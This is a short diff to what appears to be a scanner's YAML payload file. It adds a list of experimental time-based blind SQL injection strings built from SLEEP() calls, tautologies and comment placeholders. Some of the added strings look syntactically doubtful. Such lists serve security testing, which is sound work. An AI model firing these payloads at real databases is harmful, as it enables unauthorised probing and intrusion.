@@ -31,3 +31,8 @@ payloads:
                 - " '[low_level_rand_num]'"
                 - " AND SLEEP('[low_level_rand_num]')'[comment]'"
                 - " OR SLEEP('[low_level_rand_num]')'[comment]'"
+  expiremental_payloads:
+                - " AND SLEEP('[low_level_rand_num]') AND '[fix_num]'='[rand_num]' OR NOT '[fix_num]'='[rand_num]''[comment]'"
+                - " OR NOT '[fix_num]'='[rand_num]' AND '[fix_num]'='[rand_num]' OR '[fix_num]'='[rand_num]'"
+                - " '[comment]' AND '[fix_num]'='[fix_num]' SLEEP('[low_level_rand_num]')"
+                - " SLEEP('[low_level_rand_num]') SLEEP('[low_level_rand_num]') SLEEP('[low_level_rand_num]') AND '[fix_num]'='[fix_num]'"
